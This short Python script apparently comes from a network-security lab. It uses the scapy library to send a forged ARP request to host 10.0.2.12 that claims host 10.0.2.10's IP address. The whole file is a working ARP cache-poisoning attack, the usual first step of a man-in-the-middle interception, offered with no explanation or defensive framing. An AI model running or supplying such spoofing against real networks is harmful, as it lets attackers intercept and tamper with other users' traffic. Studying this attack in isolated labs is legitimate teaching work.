from scapy.all import *

A_IP = "10.0.2.12"
A_MAC = "00:0c:29:33:31:2e"
B_IP = "10.0.2.10"
M_MAC = "00:0c:29:b7:8f:c6"

packet = Ether(dst=A_MAC) / ARP(op=1, psrc=B_IP, pdst=A_IP)

sendp(packet)